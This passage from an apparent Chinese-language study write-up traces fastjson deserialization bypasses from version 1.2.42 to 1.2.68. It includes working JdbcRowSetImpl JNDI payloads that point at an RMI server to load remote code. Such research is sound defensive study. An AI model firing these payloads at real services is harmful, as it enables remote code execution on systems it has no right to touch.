         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>fastjson_1_2_42</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.42</version>
        </dependency>
    </dependencies>

</project>
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680754774564-970f1b59-70ca-4cfa-ac29-fbb87747855f.png#averageHue=%23f8f7f5&clientId=u8272b843-0f56-4&from=paste&height=815&id=u9cfbc8b6&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=134211&status=done&style=none&taskId=u4e4b5f20-ee08-46dd-adcd-7d164c8b2ec&title=&width=1536)
直接翻到`ParseConfig`这里：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680755033617-ea11aae1-5eda-454b-aae8-2c93e8e84f04.png#averageHue=%23f9f7f3&clientId=u8272b843-0f56-4&from=paste&height=816&id=u45eeb0b7&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=216441&status=done&style=none&taskId=ud84d2871-aaef-46e1-8a05-6954235af83&title=&width=1536)
可以看到，`fastjson`把原来的明文黑名单转换为`Hash`黑名单，但是并没什么用，目前已经被爆出来了大部分，具体可以参考：
> [https://github.com/LeadroyaL/fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)

然后`checkAutoType`这里进行判断，仅仅是把原来的`L`和`;`换成了`hash`的形式：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680757094959-6756ef54-ab53-482a-a0af-6a0de63a56f2.png#averageHue=%23f8f6f5&clientId=u8272b843-0f56-4&from=paste&height=815&id=u4ffb3c96&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=212881&status=done&style=none&taskId=u423c075a-9ca0-4619-a344-57be7c09850&title=&width=1536)
所以直接双写`L`和`;`即可：
```java
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
        JSONObject.parse(payload);
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680758733441-7a33dde7-2108-41f2-96fd-d455192eb9e4.png#averageHue=%23f7f6f3&clientId=u8272b843-0f56-4&from=paste&height=818&id=u6e9e41e8&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=248021&status=done&style=none&taskId=uea7fa118-d959-4194-a205-0006a867a32&title=&width=1536)
## 4. fastjson 1.2.43 反序列化漏洞
修改之前的`pom.xml`里面的版本为`1.2.43`。
直接全局搜索`checkAutoType`，看修改后的代码：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680775071552-c2abd2dd-0736-474b-85d5-3d2a0a0f9b3a.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=821&id=u90dbfc03&name=image.png&originHeight=1026&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=195448&status=done&style=none&taskId=ue63da61b-63e3-4de7-b39a-001dcf1df2f&title=&width=1536)
意思就是说如果出现连续的两个`L`，就报错。那么问题来了，你也妹对`[`进行限制啊，直接绕：
```java
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
        JSONObject.parse(payload);
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680775167890-7f3f5a07-ae61-44a4-af1e-b73c914599fd.png#averageHue=%23f7f6f5&clientId=u8272b843-0f56-4&from=paste&height=817&id=uc32870ec&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=243628&status=done&style=none&taskId=u84547233-48f3-4771-b061-5712bbd8ebd&title=&width=1536)
## 5. fastjson 1.2.44 mappings缓存导致反序列化漏洞
修改之前的`pom.xml`里面的版本为`1.2.44`。
这个版本的`fastjson`总算是修复了之前的关于字符串处理绕过黑名单的问题，但是存在之前完美在说`fastjson 1.2.25`版本的第一种`poc`的那个通过`mappings`缓存绕过`checkAutoType`的漏洞，复现如下：
```java
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\",\"autoCommit\":true}}";
        JSONObject.parse(payload);
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680775848153-f5c889aa-82e3-46c6-8875-c6878f5a82f8.png#averageHue=%23f7f6f4&clientId=u8272b843-0f56-4&from=paste&height=818&id=udaf4f9c4&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=249270&status=done&style=none&taskId=uc6ecfd51-68b4-4370-b13f-2b095333222&title=&width=1536)
## 6. fastjson 1.2.47 mappings缓存导致反序列化漏洞
原理同上，`payload`也同上。复现截图：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680776133861-28037cfe-bb18-4e8a-aaed-7fd1a3e369c6.png#averageHue=%23f7f5f4&clientId=u8272b843-0f56-4&from=paste&height=823&id=ufe14d765&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=256787&status=done&style=none&taskId=u68381a4c-f989-48ee-a8e6-76381ebe60a&title=&width=1536)
## 7.fastjson 1.2.68 反序列化漏洞
`fastjson 1.2.47`的时候爆出来的这个缓存的漏洞很严重，官方在`1.2.48`的时候就进行了限制。
我们修改上面的`pom.xml`中`fastjson`版本为`1.2.68`。
直接翻到`MiscCodec`这里，可以发现，`cache`这里默认设置成了`false`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680776973783-8ce28666-41b1-46a1-ab62-b6c333f45a0e.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=818&id=uf1c38de7&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=197671&status=done&style=none&taskId=ud425afd5-487e-427c-9d03-37023aa8493&title=&width=1536)
并且`loadClass`重载方法的默认的调用改为不缓存：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680777248813-c8b4212a-a968-4c46-a287-ab631daede97.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=815&id=uaa9155ef&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=213950&status=done&style=none&taskId=u0f0208c4-7a7f-4868-805d-c0fb6a5048f&title=&width=1536)
`fastjson 1.2.68`的一个亮点就是更新了个`safeMode`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680777390863-4080f6fa-2c82-4f4d-abf6-5262756df1bb.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=818&id=u9caf80c7&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=213569&status=done&style=none&taskId=uf347b2b9-9fdf-4fd7-8104-d2bfe099d43&title=&width=1536)
如果开启了`safeMode`，那么`autoType`就会被完全禁止。
但是，这个版本有了个新的绕过方式：`expectClass`。
仔细看`checkAutoType`函数：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680778956318-ac9ae2f8-b2c7-4ce1-9765-f13a975ec8ba.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=u0ebc4421&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=207624&status=done&style=none&taskId=u51ffae09-4478-4349-9cfa-30dea94e458&title=&width=1536)
> 以下条件的整理参考：[https://blog.csdn.net/mole_exp/article/details/122315526](https://blog.csdn.net/mole_exp/article/details/122315526)

发现同时满足以下条件的时候，可以绕过`checkAutoType`：

- `expectClass`不为`null`，且不等于`Object.class`、`Serializable.class`、`Cloneable.class`、`Closeable.class`、`EventListener.class`、`Iterable.class`、`Collection.class`；
- `expectClass`需要在缓存集合`TypeUtils#mappings`中；
- `expectClass`和`typeName`都不在黑名单中；
- `typeName`不是`ClassLoader`、`DataSource`、`RowSet`的子类；
- `typeName`是`expectClass`的子类。

这个`expectClass`并不是什么陌生的新名词，我们在前置知识里面的`demo`中的这个`Person.class`就是期望类：
```java
Person person2 = JSON.parseObject(jsonString2, Person.class);
```
但是之前的那些`payload`执行的时候，期望类这里都是`null`，那么是哪些地方调用了呢？我们直接全局搜索`parser.getConfig().checkAutoType`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680779902751-3dbcc23e-48e6-44be-b9cf-b2dc06fe1aa0.png#averageHue=%23f7efe9&clientId=u8272b843-0f56-4&from=paste&height=510&id=ue9a11536&name=image.png&originHeight=637&originWidth=729&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52288&status=done&style=none&taskId=ub780def9-05b0-4ad6-b030-65effb37901&title=&width=583.2)
一个是`JavaBeanDeserializer`的`deserialze`这里：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680779685303-8744e9a5-f783-41c1-8c82-25f52f511814.png#averageHue=%23f9f6f5&clientId=u8272b843-0f56-4&from=paste&height=816&id=u2ad5c90a&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=236850&status=done&style=none&taskId=u1f53ea35-31b4-46a9-a19b-963e88f00c4&title=&width=1536)
另一个是`ThrowableDeserializer`的`deserialze`这里：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680779966075-84e49d32-ad2c-40fa-9567-a080307c37c9.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=ued608110&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=224876&status=done&style=none&taskId=uff4d739d-577e-4572-805d-944bb078745&title=&width=1536)具体的分析可以看`tr1ple`师傅的文章，写的实在是太详细了：
> [https://www.cnblogs.com/tr1ple/p/13489260.html](https://www.cnblogs.com/tr1ple/p/13489260.html)

# 四、参考与致谢
我在学习`fastjson`漏洞的时候，阅读参考了以下文章，每篇文章都或多或少地给予了我帮助与启发，于是在此一并列出！也十分感谢`4ra1n`师傅和`su18`师傅热情地回答我一个`Java`初学者提出的可能有点傻的问题。（笑）
```java
https://www.anquanke.com/post/id/248892
https://paper.seebug.org/1698/
https://www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/
https://www.rc.sb/fastjson/
https://drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl利用链/
https://blog.weik1.top/2021/09/08/Fastjson 反序列化历史漏洞分析/
http://blog.topsec.com.cn/fastjson-1-2-24反序列化漏洞深度分析/
https://xz.aliyun.com/t/7107
https://www.javasec.org/java-vuls/FastJson.html
https://www.freebuf.com/articles/web/265904.html
https://b1ue.cn/archives/506.html
http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/
https://forum.butian.net/share/1092
https://www.freebuf.com/vuls/178012.html
https://www.cnblogs.com/nice0e3/p/14776043.html
https://www.cnblogs.com/nice0e3/p/14601670.html
http://140.143.242.46/blog/024.html
https://paper.seebug.org/994/
https://paper.seebug.org/1192/
http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/
https://zhuanlan.zhihu.com/p/544463507
https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/
https://www.anquanke.com/post/id/240446
https://yaklang.io/products/article/yakit-technical-study/fast-Json/
https://su18.org/post/fastjson/#2-fastjson-1225
https://cloud.tencent.com/developer/article/1957185
https://yaklang.io/products/article/yakit-technical-study/fast-Json
https://developer.aliyun.com/article/842073
http://wjlshare.com/archives/1526
https://xz.aliyun.com/t/9052#toc-16
https://blog.csdn.net/Adminxe/article/details/105918000
https://blog.csdn.net/q20010619/article/details/123155767
https://xz.aliyun.com/t/7027#toc-3
https://xz.aliyun.com/t/7027#toc-5
https://www.sec-in.com/article/950
https://xz.aliyun.com/t/7027#toc-14
https://www.cnblogs.com/nice0e3/p/14776043.html#1225-1241-绕过
https://www.cnblogs.com/nice0e3/p/14776043.html#1225版本修复
https://y4er.com/posts/fastjson-1.2.80/#回顾fastjson历史漏洞
https://github.com/su18/hack-fastjson-1.2.80
https://blog.csdn.net/mole_exp/article/details/122315526
https://www.cnblogs.com/ph4nt0mer/p/13065373.html
https://alewong.github.io/2020/09/14/Fastjson-1-2-68版本反序列化漏洞分析篇/
https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html
https://www.anquanke.com/post/id/225439
```
